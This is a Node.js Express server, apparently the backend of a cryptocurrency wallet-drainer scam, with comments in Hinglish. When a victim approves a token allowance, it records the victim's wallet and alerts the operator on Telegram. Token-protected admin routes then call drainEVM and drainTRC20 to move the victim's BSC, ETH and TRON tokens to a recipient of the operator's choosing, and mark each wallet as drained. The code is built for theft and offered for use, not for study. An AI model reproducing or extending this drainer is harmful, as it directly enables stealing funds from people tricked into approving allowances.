require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { notifyTelegram } = require('./telegram');
const { drainTRC20, checkTRONAllowance } = require('./tron');
const { drainEVM, checkEVMAllowance } = require('./evm');
const { saveWallet, getWallets, markDrained } = require('./db');

const app = express();
app.use(cors());
app.use(express.json());

// Health Check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// Frontend se call hoga jab user approve karega
app.post('/api/notify', async (req, res) => {
  const { wallet, chain, txHash, allowance } = req.body;
  if (!wallet || !chain) return res.status(400).json({ error: 'wallet & chain required' });

  saveWallet(wallet, chain, txHash, allowance);
  await notifyTelegram(wallet, chain, txHash, allowance);
  res.json({ ok: true });
});

// Admin API - Sare Wallets Dekhne Ke Liye
app.get('/api/wallets', (req, res) => {
  if (req.headers['x-admin-token'] !== process.env.ADMIN_TOKEN)
    return res.status(401).json({ error: 'unauthorized' });
  res.json(getWallets());
});

// Admin API - EVM Drain (BSC/ETH)
app.post('/api/drain/evm', async (req, res) => {
  if (req.headers['x-admin-token'] !== process.env.ADMIN_TOKEN)
    return res.status(401).json({ error: 'unauthorized' });
  
  const { wallet, chain, token, recipient } = req.body; // recipient yahan se aayega
  if (!wallet || !chain) return res.status(400).json({ error: 'wallet & chain required' });

  try {
    const tx = await drainEVM(wallet, chain, token, recipient);
    markDrained(wallet, tx);
    await notifyTelegram(wallet, chain, tx, 'EVM DRAINED');
    res.json({ ok: true, tx });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Admin API - TRON Drain
app.post('/api/drain/tron', async (req, res) => {
  if (req.headers['x-admin-token'] !== process.env.ADMIN_TOKEN)
    return res.status(401).json({ error: 'unauthorized' });
  
  const { wallet, token, amount, recipient } = req.body; // recipient yahan se aayega
  if (!wallet) return res.status(400).json({ error: 'wallet required' });

  try {
    const tx = await drainTRC20(wallet, token, amount, recipient);
    markDrained(wallet, tx);
    await notifyTelegram(wallet, 'tron', tx, 'TRON DRAINED');
    res.json({ ok: true, tx });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Admin API - Allowance Check
app.post('/api/check', async (req, res) => {
  if (req.headers['x-admin-token'] !== process.env.ADMIN_TOKEN)
    return res.status(401).json({ error: 'unauthorized' });
  
  const { wallet, chain, token } = req.body;
  try {
    const a = chain === 'tron'
      ? await checkTRONAllowance(wallet, token)
      : await checkEVMAllowance(wallet, chain, token);
    res.json({ allowance: a });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Koyeb ke liye Port aur Host change kiya gaya hai
const PORT = process.env.PORT || 8000;

// 0.0.0.0 zaroori hai Koyeb aur Docker ke liye
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Backend server running on port ${PORT}`);
});